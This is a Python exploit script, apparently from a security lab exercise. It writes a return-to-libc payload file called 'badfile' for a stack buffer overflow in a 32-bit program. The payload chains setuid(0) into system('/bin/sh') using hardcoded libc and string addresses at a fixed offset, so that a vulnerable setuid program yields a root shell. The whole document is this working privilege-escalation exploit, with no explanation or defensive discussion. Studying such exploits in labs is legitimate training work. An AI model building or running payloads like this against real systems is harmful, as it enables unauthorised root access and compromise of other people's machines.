#!/usr/bin/python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

dist = 124		# distance from beginning of buffer to ebp

sh_addr = 0xbffffdef     # The address of "/bin/sh"
content[dist+16:(dist+16)+4] = (sh_addr).to_bytes(4,byteorder='little')

zero = 0x00000000        # 0 is the argument for setuid()
content[dist+12:(dist+12)+4] = (zero).to_bytes(4,byteorder='little')

system_addr = 0xb7e42da0     # The address of system()
content[dist+8:(dist+8)+4] = (system_addr).to_bytes(4,byteorder='little')

setuid_addr = 0xb7eb9170     # The address of setuid()
content[dist+4:(dist+4)+4] = (setuid_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
